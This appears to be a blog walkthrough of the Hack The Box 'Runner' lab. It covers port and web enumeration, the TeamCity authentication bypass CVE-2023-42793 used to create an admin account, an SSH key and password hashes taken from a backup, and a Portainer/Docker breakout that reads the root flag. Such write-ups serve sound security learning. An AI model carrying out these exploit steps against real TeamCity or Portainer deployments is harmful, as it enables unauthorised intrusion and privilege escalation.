---
title: HTB - Runner
date: 2024-08-25 00:00:00 + 1000
categories: [Linux,Web App,CTF,HTB]
tags: [htb,TeamCity, CVE-2023-42793, Portainer, Docker, AuthenticationBypass]
comments: false
---

This HTB Runner Medium-rated machine involved exploiting a TeamCity authentication bypass vulnerability (CVE-2023-42793) to gain initial access, followed by leveraging Portainer access to create a privileged Docker container and read the root flag

## Common Enumeration
### Nmap

Running the `nmap -p- -sC -sV -oA recon/allport 10.10.11.13 --open` - which found three open ports
- 22/tcp
- 80/tcp
- 8000/tcp - nagios-nsca Nagios NSCA

```bash
$ nmap -p- -sC -sV -oA recon/allport 10.10.11.13 --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 18:25 AEST
Nmap scan report for 10.10.11.13
Host is up (0.011s latency).
Not shown: 65516 closed tcp ports (conn-refused), 16 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://runner.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.22 seconds
```

Accessing the target IP redirected me to `http://runner.htb/`, so I updated my `/etc/hosts` file

```bash
10.10.11.13    runner.htb teamcity.runner.htb
```

### Web Reconnaissance 

I hit up `http://runner.htb/`, and the website was pretty basic, talking about their CI/CD solutions. It was a bit of a dead end, but at the bottom of the page, found an email address: `sales@runner.htb`

![img](/assets/img/Runner/1.webp)

#### Directory Brute force

I fired up `ffuf`, but it didn't turn up anything too exciting

```bash
$ ffuf -u 'http://runner.htb/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://runner.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 4ms]
.                       [Status: 200, Size: 16910, Words: 4339, Lines: 392, Duration: 4ms]
:: Progress: [43007/43007] :: Job [1/1] :: 8695 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

#### Subdomain Enumeration

I spent a couple of hours trying different subdomains using a SecList wordlist, but nothing was working. Finally, I stumbled upon the subdomain `teamcity.runner.htb` using the "combined_subdomains.txt" wordlist

- Navigating to `http://teamcity.runner.htb/` brought me to the TeamCity login page. Shows it's running on `Version 2023.05.3 (build 129390)` version

![img](/assets/img/Runner/5.webp)

I tried a quick password reset with `admin@runner.htb`, but no dice. No user enumeration here!


![img](/assets/img/Runner/6.webp)

Since I had no credentials, A quick Google search found that `Version 2023.05.3 (build 129390)` version is vulnerable to authentication bypass and Remote Code Execution (RCE)! -  [Exploiting CVE-2023-42793](https://www.logpoint.com/en/blog/emerging-threats/russian-threat-actor-exploiting-cve-2023-42793/) 

The vulnerability allows you to send a POST request to `/app/rest/users/id:1/tokens/RPC2` to grab an access token. Apparently, TeamCity skips authentication checks for requests matching the `/**/RPC2` wildcard path. Sneaky!

- I grabbed an RCE exploit script from Exploit-DB - [Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/51884). This handy script creates a TeamCity admin account for you

```bash
$ python3 poc.py -u http://teamcity.runner.htb

=====================================================
*       CVE-2023-42793                              *
*  TeamCity Admin Account Creation                  *   
*                                                   *
*  Author: ByteHunter                               *
=====================================================

Token: eyJ0eXAiOiAiVENWMiJ9.bnl4OVNHcjdKYXhndkdZdGNHd2x4MzE3ZGlB.NjI3NDZhYmEtZDMxZC00NGQwLThkZWEtZTU0MGMzMTcxODEy
Token saved to ./token
Successfully exploited!
URL: http://teamcity.runner.htb
Username: admin.Vpl9
Password: Password@123
```

Armed with the newly created credentials (`admin.Vpl9:Password@123`), I logged into TeamCity

![img](/assets/img/Runner/7.webp)

After poking around a bit, I decided to try a backup. I navigated to the admin panel, ran a backup, and selected the "custom" option, making sure to include the database, build logs, and server settings

![img](/assets/img/Runner/8.webp)

The backup was available for download at `/data/teamcity_server/datadir/backup/TeamCity_Backup_20240518_050037.zip`

![img](/assets/img/Runner/9.webp)

#### Checking Backups

Rummaging through the backup, I stumbled upon a private SSH key under `/config/projects/AllProjects/pluginData/ssh_keys`. Bingo! But hold on, no username just yet...

```text
$ cat id_rsa                                                                                                                           
-----BEGIN OPENSSH PRIVATE KEY-----                                                                                                      
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAlk2rRhm7T2dg2z3+Y6ioSOVszvNlA4wRS4ty8qrGMSCpnZyEISPl
htHGpTu0oGI11FTun7HzQj7Ore7YMC+SsMIlS78MGU2ogb0Tp2bOY5RN1/X9MiK/SE4liT
njhPU1FqBIexmXKlgS/jv57WUtc5CsgTUGYkpaX6cT2geiNqHLnB5QD+ZKJWBflF6P9rTt
....snap....
```

Next, I peeked into the `database_dump` and found two users: admin and matthew

```text
$ cat users
ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1716003942846, BCRYPT
2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
```

## SSH as John

With the `id_rsa` key in hand, I tried SSHing as `john`

```bash
$ ssh -i id_rsa john@runner.htb
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)
...snap...
john@runner:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)
john@runner:~$ whoami
john
john@runner:~$ 
```

Got the user.txt 

```bash
d94d1...
```

## Privilege Escalation

Before jumping into any automated scripts, I like to do some manual poking around. Running `netstat -lantp` showed some interesting ports listening

```bash
john@runner:~$ netstat -lantp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                   
...snap...
```

Port `9000` and `9443` caught my eye. A quick Google search told me that 9000 is often used by Portainer, a Docker management tool
#### Port forwarding using ssh

To access Portainer, I set up port forwarding using SSH

```bash
ssh -i id_rsa -L 9000:localhost:9000 john@runner.htb
```

This command forwards my local port 9000 to the remote host's localhost:9000
### Portainer Login page

With port forwarding in place, I navigated to `http://127.0.0.1:9000` and it brings up the Portainer login page

![img](/assets/img/Runner/10.webp)

Remember the `matthew` user from the backup? After cracking his password hash (`$2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em`), I discovered his password was `piper123`. I logged in!
### Creating and Running Container

Inside Portainer, I found two Docker images: `ubuntu` and `teamcity`

![img](/assets/img/Runner/11.webp)

There were also three different networks available

![img](/assets/img/Runner/12.webp)

Before creating a new container, I have created private volumes

![img](/assets/img/Runner/14.webp)

Then, I spun up a new container using the `sha256:ca2b0f26964cf2e80ba3e084d5983dab293fdb87485dc6445f3f7bbfc89d7459` image, making sure to enable "Interactive & TTY."

![img](/assets/img/Runner/16.webp)

I also mapped the container's `/mnt/root` directory to my newly created `justme` volume

![img](/assets/img/Runner/17.webp)

### Docker reading root.txt

Now for the final trick! I used Portainer's web editor to modify the Dockerfile of the running container

![img](/assets/img/Runner/18.webp)

```bash
FROM ubuntu:latest
WORKDIR /proc/self/fd/8
RUN cat ../../../root/root.txt
```

Got the `root.txt` flag

![img](/assets/img/Runner/19.webp)